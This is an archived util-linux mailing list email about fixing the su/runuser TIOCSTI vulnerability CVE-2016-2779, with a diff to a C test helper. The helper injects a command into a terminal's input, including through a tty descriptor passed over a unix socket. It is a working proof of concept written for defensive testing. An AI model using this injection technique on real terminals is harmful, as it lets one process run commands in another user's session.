Return-Path: util-linux-owner@vger.kernel.org
Received: from mx1.redhat.com ([209.132.183.28]:44428 "EHLO mx1.redhat.com"
        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
        id S1751469AbcJCN3V (ORCPT <rfc822;util-linux@vger.kernel.org>);
        Mon, 3 Oct 2016 09:29:21 -0400
Date: Mon, 3 Oct 2016 15:29:18 +0200
From: Karel Zak <kzak@redhat.com>
To: Florian Weimer <fw@deneb.enyo.de>
Cc: Stanislav Brabec <sbrabec@suse.cz>, util-linux@vger.kernel.org,
        Federico Bento <up201407890@alunos.dcc.fc.up.pt>,
        Jiri Slaby <jslaby@suse.cz>
Subject: Re: Fixing su + runuser vulnerability CVE-2016-2779
Message-ID: <20161003132918.lkgiqv2oejtuy6xo@ws.net.home>
References: <56D7409A.6050407@suse.cz>
 <20160307131358.kzu4qb5yu6u7fd4x@ws.net.home>
 <56DEF7A4.4090209@suse.cz>
 <20160929144015.7cij7pbva3etcqeo@ws.net.home>
 <87vaxaao33.fsf@mid.deneb.enyo.de>
 <20161003102830.mczd6omz6lqftrzy@ws.net.home>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
In-Reply-To: <20161003102830.mczd6omz6lqftrzy@ws.net.home>
Sender: util-linux-owner@vger.kernel.org
List-ID: <util-linux.vger.kernel.org>

On Mon, Oct 03, 2016 at 12:28:30PM +0200, Karel Zak wrote:
> On Sun, Oct 02, 2016 at 03:16:00PM +0200, Florian Weimer wrote:
> > * Karel Zak:
> > 
> > > I have applied patch based on libseccomp syscall filter:
> > >
> > >    https://github.com/karelzak/util-linux/commit/8e4925016875c6a4f2ab4f833ba66f0fc57396a2
> > >
> > > it works as expected, but IMHO it's workaround for our stupid kernel...
> > 
> > How does this work?
> > 
> > Isn't it possible to pass the descriptor to another, unrestricted
> > process (perhaps spawned from cron) and then run the ioctl from there?
> 
>  Good point, I don't know. The question is how secure is TIOCSTI

 I have tried to send tty FD to another process by unix socket and the 
 ioctl result is EPERM. See the test_tiocsti below. It seems only root
 can do it (try suid the test program).

 session A:
    ./test_tiocsti --receive
 session B:
    runuser -u kzak -- ./test_tiocsti --send

>  The ioctl should be fired in the hell... :-)

 This is still true.

    Karel


diff --git a/tests/helpers/test_tiocsti.c b/tests/helpers/test_tiocsti.c
index c269dc0..5450b64 100644
--- a/tests/helpers/test_tiocsti.c
+++ b/tests/helpers/test_tiocsti.c
@@ -18,10 +18,213 @@
  */
 
 #include <sys/ioctl.h>
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <getopt.h>
+#include <unistd.h>
+#include <sys/socket.h>
+#include <sys/un.h>
 
-int main(void)
+#include "c.h"
+
+#define SOCKET_NAME "/tmp/TIOCSTI.socket"
+int connection_socket, data_socket;
+
+
+static void do_tiocsti(int fd, const char *cmd)
+{
+	printf("writing \"%s\" to file descriptor %d\n", cmd, fd);
+	while (*cmd) {
+		if (ioctl(fd, TIOCSTI, cmd++) < 0)
+			err(EXIT_FAILURE, "ioctl failed");
+	}
+}
+
+static int receive_tty_fd(void)
 {
-  char *cmd = "id -u -n\n";
-  while(*cmd)
-   ioctl(0, TIOCSTI, cmd++);
+	int fd;
+	struct sockaddr_un name;
+	struct msghdr msg;
+	struct iovec iov[1];
+	struct cmsghdr  *cmptr;
+	char buf[BUFSIZ];
+	ssize_t n;
+	union {
+		struct cmsghdr cm;
+		char control[CMSG_SPACE(sizeof(int))];
+	} control_un;
+
+	unlink(SOCKET_NAME);
+
+	connection_socket = socket(AF_UNIX, SOCK_SEQPACKET, 0);
+	if (connection_socket < 0)
+		err(EXIT_FAILURE, "socked failed");
+
+	memset(&name, 0, sizeof(struct sockaddr_un));
+	name.sun_family = AF_UNIX;
+	strncpy(name.sun_path, SOCKET_NAME, sizeof(name.sun_path) - 1);
+
+	if (bind(connection_socket, (const struct sockaddr *) &name,
+			sizeof(struct sockaddr_un)) < 0)
+		err(EXIT_FAILURE, "bind failed");
+
+	if (listen(connection_socket, 20) < 0)
+		err(EXIT_FAILURE, "listen failed");
+
+	data_socket = accept(connection_socket, NULL, NULL);
+	if (data_socket < 0)
+		err(EXIT_FAILURE, "accept failed");
+
+	msg.msg_control = control_un.control;
+	msg.msg_controllen = sizeof(control_un.control);
+	msg.msg_name = NULL;
+	msg.msg_namelen = 0;
+
+	iov[0].iov_base = buf;
+	iov[0].iov_len = sizeof(buf);
+	msg.msg_iov = iov;
+	msg.msg_iovlen = 1;
+
+	if ((n = recvmsg(data_socket, &msg, 0)) <= 0)
+		err(EXIT_FAILURE, "receive fd failed");
+
+	cmptr = CMSG_FIRSTHDR(&msg);
+
+	if (cmptr && cmptr->cmsg_len == CMSG_LEN(sizeof(int))) {
+
+		if (cmptr->cmsg_level != SOL_SOCKET)
+			err(EXIT_FAILURE, "control level != SOL_SOCKET");
+		if (cmptr->cmsg_type != SCM_RIGHTS)
+			err(EXIT_FAILURE, "control type != SCM_RIGHTS");
+		memcpy(&fd, CMSG_DATA(cmptr), sizeof(int));
+	} else
+		err(EXIT_FAILURE, "failed to parse message");
+
+	return fd;
+}
+
+static void send_tty_fd(int fd)
+{
+	struct sockaddr_un addr;
+	char buf[BUFSIZ];
+	struct msghdr   msg;
+	struct iovec    iov[1];
+	union {
+		struct cmsghdr    cm;
+		char              control[CMSG_SPACE(sizeof(int))];
+	} control_un;
+	struct cmsghdr  *cmptr;
+
+
+	data_socket = socket(AF_UNIX, SOCK_SEQPACKET, 0);
+	if (data_socket < 0)
+		err(EXIT_FAILURE, "socked failed");
+
+	memset(&addr, 0, sizeof(struct sockaddr_un));
+
+	addr.sun_family = AF_UNIX;
+	strncpy(addr.sun_path, SOCKET_NAME, sizeof(addr.sun_path) - 1);
+
+	if (connect(data_socket, (const struct sockaddr *) &addr,
+			sizeof(struct sockaddr_un)) < 0)
+		err(EXIT_FAILURE, "connect failed");
+
+	msg.msg_control = control_un.control;
+	msg.msg_controllen = sizeof(control_un.control);
+
+	cmptr = CMSG_FIRSTHDR(&msg);
+	cmptr->cmsg_len = CMSG_LEN(sizeof(int));
+	cmptr->cmsg_level = SOL_SOCKET;
+	cmptr->cmsg_type = SCM_RIGHTS;
+	memcpy(CMSG_DATA(cmptr), &fd, sizeof(int));
+
+	msg.msg_name = NULL;
+	msg.msg_namelen = 0;
+
+	iov[0].iov_base = buf;
+	iov[0].iov_len = sizeof(buf);
+	msg.msg_iov = iov;
+	msg.msg_iovlen = 1;
+
+	if (sendmsg(data_socket, &msg, 0) < 0)
+		err(EXIT_FAILURE, "sendmsg failed");
+}
+
+static void __attribute__((__noreturn__)) help(FILE *out)
+{
+	fprintf(out, " %s [options]\n", program_invocation_short_name);
+	fputs(" -t, --tty <path>   do TIOCSTI on the tty\n", out);
+	fputs(" -h, --help         this help\n", out);
+	fputs(" -r, --receive      listen and then do TIOCSTI on foreign FD\n", out);
+	fputs(" -s, --send         send tty FD\n", out);
+
+	exit(out == stderr ? EXIT_FAILURE : EXIT_SUCCESS);
+}
+
+enum {
+	ACT_DOIT,
+	ACT_SEND,
+	ACT_RECEIVE
+};
+
+int main(int argc, char *argv[])
+{
+	const char *ttyname = NULL;
+	int c, fd = 0, act = ACT_DOIT;
+	const char *cmd = "id -u -n\n";
+
+	static const struct option longopts[] = {
+		{ "tty",	1, 0, 't' },
+		{ "help",       0, 0, 'h' },
+		{ "receive",    0, 0, 'r' },
+		{ "send",       0, 0, 's' },
+		{ NULL, 0, 0, 0 },
+	};
+
+	while ((c = getopt_long(argc, argv, "rst:h", longopts, NULL)) != -1) {
+		switch(c) {
+		case 'r':
+			act = ACT_RECEIVE;
+			break;
+		case 's':
+			act = ACT_SEND;
+			break;
+		case 't':
+			ttyname = optarg;
+			break;
+		case 'h':
+			help(stdout);
+			break;
+		default:
+			help(stderr);
+		}
+	}
+
+
+	switch (act) {
+	case ACT_RECEIVE:
+		fd = receive_tty_fd();
+		do_tiocsti(fd, cmd);
+		close(data_socket);
+		close(connection_socket);
+		break;
+	case ACT_SEND:
+		send_tty_fd(0);
+		sleep(20);
+		break;
+	case ACT_DOIT:
+		if (ttyname) {
+			fd = open(ttyname, O_RDWR);
+			if (fd < 0)
+				err(EXIT_FAILURE, "%s: open failed", ttyname);
+		}
+		do_tiocsti(fd, cmd);
+		break;
+	}
+
+	return EXIT_SUCCESS;
 }
